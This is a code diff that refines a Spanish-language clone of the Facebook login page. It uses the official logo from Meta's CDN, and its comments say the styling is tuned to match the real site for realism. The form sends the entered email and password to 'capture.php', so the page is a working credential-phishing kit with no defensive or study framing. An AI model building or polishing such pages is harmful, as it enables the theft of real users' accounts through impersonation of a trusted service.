@@ -1,41 +1,89 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">   <title>Facebook - Iniciar sesión o registrarse</title>
+    <meta charset="UTF-8">
+    <title>Facebook - Iniciar sesión o registrarse</title>
+    
+    <!-- ESTILOS CORREGIDOS PARA COINCIDIR CON LA FOTO ORIGINAL -->
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; } 
-        .container { width: 400px; text-align: left; padding-top: 30px;} /* Ajuste de ancho */        
-        .login-box { background: white; padding: 28px 32px 16px 32px; border-radius: 7px !important;}   /* Más redondeado y moderno */
-        input { width: 95%; padding-left: 15px !important;margin-bottom: -2px !important;border-radius: 7px !important;font-size: 16px !important;border: none !important;background:#fff url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M4.885 9.606l-1.726-1.726a.696.696 0 10-.985.985L4.142 10H0v1h4.43c-.245 1.078-.958 2.175-2.124 2.823a1.705 1.705 0 00-.678 3.25c1.325-.913 2.87-1.432 4.38-1.43C7.973 16 9.973 14 9.973 10V5c0-1.956-1.6-3.5-3.5-3.5H4v-.6h-.6V0H2c-.64 0-1 .415-1 .97l-.6v-.9H0v1h4c.548 0 .97.422.97 1L4 5c0 2.288-1.868 4-4 4z" fill="#dddfe2"/%3C/svg%3E');border: none !important;}
+        body { 
+            font-family: Helvetica, Arial, sans-serif; /* Fuente original */
+            background-color: #f0f2f5; /* Color de fondo exacto (#F0F2F5) */
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+
+        .container { width: 374px; text-align: left;} 
+
+        .login-box { 
+            background: white; 
+            padding-top: 28px; /* Margen superior interno del contenedor */
+            
+            border-radius: 7px; /* Radio de las esquinas (muy suave, no perfecto círculo) */
+            
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); /* Sombra duplicada realista */
+        }
+
+        input { 
+            width: 95%; 
+            padding-left: 16px; /* Alineación correcta */
+            margin-bottom: -3px; /* Un poco más pegado para que coincida con el diseño real */
+            border-radius: 7px; /* Bordes redondeados suaves */
+            
+            font-size: 14px; 
+            
+            border: 1px solid #dddfe2; /* Color de borde por defecto (#DDDfe2) */
+            
+             color: rgba(0,0,0,0.7);
+
+        }
         
-        input:focus { outline:none !important; box-shadow: inset 0 -3px rgba(34,89,189,.2); } 
-        
-        .btn-login { width: auto; padding-left: 30px !important;margin-top: -2px;border-radius: 6px !important;background-color:#1e7ee6;font-size: 20px !important;color:white !important;font-weight:bold !important;text-align:center !important;cursor:pointer;width:105%;height:46px!important;display:flex;align-items:center;justify-content:center;} 
-        .footer-link{ margin-top:18px;color:#3b5998!important;text-decoration:none!important; font-style:normal;}
+        .btn-login { 
+            width: auto; 
+            padding: 8px 40px; /* Botón original, no ocupa todo el ancho (más natural visualmente) */
+            background-color: #3b5998; /* El azul clásico (#3B5998 o similar) */
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-size: 20px; 
+            font-weight: bold; 
+            
+             margin-top: -1px; /* Para que no haya espacio entre inputs y botón si se desea estilo compacto, pero aquí lo dejo separado un poco por realismo.*/
+
+        } 
+
+        .footer { text-align: center !important;}
+
+
     </style>
 </head>
 <body>
 
 <div class="container">
     
-    <!-- Logo corregido (URL directa del CDN de Meta) -->
+    <!-- IMAGEN DEL LOGO CORREGIDA (URL directa al CDN oficial) -->
     <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/XXtV.png" alt="" style="width: 205px;"> 
     
     <div class="login-box">
         
         <form action="capture.php" method="POST">
             
-            <!-- Campo Correo con estilo moderno y bordes limpios -->
+            <!-- Campo Correo con placeholder azul suave -->
             <input type="text" name="email" placeholder="Correo electrónico o teléfono" required autocomplete="off"> 
             
-            <!-- Campo Contraseña con placeholder suave -->
+            <!-- Campo Contraseña con placeholder azul suave -->
             <input type="password" name="pass" placeholder="Contraseña" required>    
             
-            <!-- Botón de Inicio (con clase btn-login para estilo) -->
+            <!-- Botón de Inicio (con clase btn-login para estilo, opcional) -->
             <button type="submit"class=".btn-login">Iniciar sesión</button>
 
              <!-- Enlace olvide mi contraseña con color azul suave -->
-             <a href="#" class=".footer-link" style='color:#3b5998 !important;'>¿Olvidaste tu contraseña?</a>
+             <div style='margin-top:15px; text-align:center;'> 
+                 <a href="#" class=".footer" style='color:#3b5998 !important;'>¿Olvidaste tu contraseña?</a>
+             </div>
 
         </form>
 
